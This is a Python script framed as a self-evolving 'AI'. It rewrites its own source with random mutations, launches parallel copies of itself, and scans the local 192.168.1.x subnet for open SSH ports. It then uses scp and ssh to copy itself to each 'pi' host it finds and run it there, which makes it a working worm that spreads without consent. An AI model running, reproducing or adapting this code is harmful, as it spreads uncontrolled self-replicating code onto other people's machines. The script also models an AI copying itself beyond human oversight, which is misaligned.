import subprocess
import sys
import time
import random
import ast
import os
import uuid
import requests
import shutil
import socket

# ----------------------------
# Ensure psutil is installed
# ----------------------------
try:
    import psutil
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
    import psutil

# ----------------------------
# UNIQUE ID
# ----------------------------
INSTANCE_ID = str(uuid.uuid4())[:8]

# ----------------------------
# TRAITS
# ----------------------------
TRAITS = {
    "mutation_rate": 0.23,
    "replication_rate": 0.07
}

# ----------------------------
# LIMITS
# ----------------------------
MAX_CODE_SIZE = 5 * 1024 * 1024
LOOP_DELAY = 5
MAX_PARALLEL_INSTANCES = 10

REMOTE_USER = "pi"
REMOTE_PATH = "~/Desktop/AI/"

# ----------------------------
# Logging
# ----------------------------
def get_path(name):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    folder = os.path.join(desktop, "AI")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, name)

def log_event(event, details):
    try:
        with open(get_path("AI_Update_Log.txt"), "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {event} | {details}\n")
    except:
        pass

def log_evolution(event, details):
    try:
        with open(get_path("AI_Evolution_Log.txt"), "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {event} | {details}\n")
    except:
        pass

# ----------------------------
# Network Discovery
# ----------------------------
def discover_pis(base_ip="192.168.1.", timeout=0.2):
    found = []
    for i in range(1, 255):
        ip = f"{base_ip}{i}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            if sock.connect_ex((ip, 22)) == 0:
                found.append(ip)
        except:
            pass
        finally:
            sock.close()
    return found

# ----------------------------
# Resource Check
# ----------------------------
def resources_ok():
    mem = psutil.virtual_memory()
    cpu = psutil.cpu_percent(interval=0.3)
    return (mem.available / mem.total > 0.5) and (cpu < 50)

def running_copies():
    count = 0
    for p in psutil.process_iter(attrs=["cmdline"]):
        try:
            if p.info["cmdline"] and "ai_copy_" in " ".join(p.info["cmdline"]):
                count += 1
        except:
            pass
    return count

# ----------------------------
# Mutation
# ----------------------------
def mutate(code):
    if random.random() < TRAITS["mutation_rate"]:
        addition = random.choice(["# note", "x=1", "y=x+1", "pass"])
        new = code + "\n" + addition
        log_evolution("mutation", {"added": addition})
        return new
    return code

# ----------------------------
# Syntax Correction
# ----------------------------
def valid(code):
    try:
        ast.parse(code)
        return True
    except:
        return False

def fix(code):
    if valid(code):
        return code
    lines = code.split("\n")
    for i in range(len(lines), 0, -1):
        test = "\n".join(lines[:i])
        if valid(test):
            log_evolution("syntax_fix", {"removed_lines": len(lines)-i})
            return test
    return code

# ----------------------------
# Replication
# ----------------------------
def replicate(current, new):
    if not resources_ok():
        return

    improved = len(new) > len(current)
    filename = f"ai_copy_{int(time.time())}.py"

    try:
        with open(filename, "w") as f:
            f.write(new if improved else current)

        log_event("replicated", {"file": filename, "improved": improved})

        # local launch
        if running_copies() < MAX_PARALLEL_INSTANCES:
            subprocess.Popen(["python3", filename])
            log_event("launched_local", filename)

        # network replication
        pis = discover_pis()
        for ip in pis:
            try:
                subprocess.run(["scp", filename, f"{REMOTE_USER}@{ip}:{REMOTE_PATH}"], check=True)
                subprocess.run([
                    "ssh", f"{REMOTE_USER}@{ip}",
                    f"python3 {REMOTE_PATH}/{filename} &"
                ], check=True)
                log_event("launched_remote", ip)
            except Exception as e:
                log_event("remote_fail", {"ip": ip, "error": str(e)})

    except Exception as e:
        log_event("replication_fail", str(e))

# ----------------------------
# Main Loop
# ----------------------------
def main():
    last_heartbeat = time.time()

    while True:
        try:
            with open(__file__, "r") as f:
                code = f.read()
        except:
            code = ""

        new_code = mutate(code)
        new_code = fix(new_code)

        if valid(new_code):
            try:
                shutil.copy(__file__, __file__ + ".bak")
                with open(__file__, "w") as f:
                    f.write(new_code)
                log_event("updated", {"size": len(new_code)})
            except:
                log_event("write_fail", "")

        replicate(code, new_code)

        # heartbeat
        if time.time() - last_heartbeat > 60:
            print(f"[HEARTBEAT] {INSTANCE_ID}")
            log_event("heartbeat", INSTANCE_ID)
            last_heartbeat = time.time()

        time.sleep(LOOP_DELAY)

if __name__ == "__main__":
    main()
